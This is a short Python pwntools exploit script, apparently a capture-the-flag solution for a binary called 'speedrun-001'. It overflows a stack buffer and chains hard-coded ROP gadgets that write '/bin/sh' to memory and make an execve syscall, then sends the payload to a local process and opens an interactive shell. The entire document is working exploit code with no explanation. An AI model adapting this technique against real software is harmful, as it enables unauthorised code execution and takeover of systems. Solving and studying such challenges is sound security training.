from pwn import *

# ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)
syscall = p64(0x40129c)
moveFromRdxToRaxAddr = p64(0x48d251)

writeStrAddr = p64(0x6b6000)
returnAddrOffset = 0x7fffffffe1c8 - 0x7fffffffddc0

payload = b"0" * returnAddrOffset

# Write shell path
payload += popRdx
payload += b"/bin/sh\x00"
payload += popRax
payload += writeStrAddr
payload += moveFromRdxToRaxAddr

# Call shell
payload += popRax
payload += p64(0x3b)
payload += popRdi
payload += writeStrAddr
payload += popRsi
payload += p64(0)
payload += popRdx
payload += p64(0)
payload += syscall

target = process('./speedrun-001')
target.recvuntil('words?')
target.sendline(payload)
target.interactive()
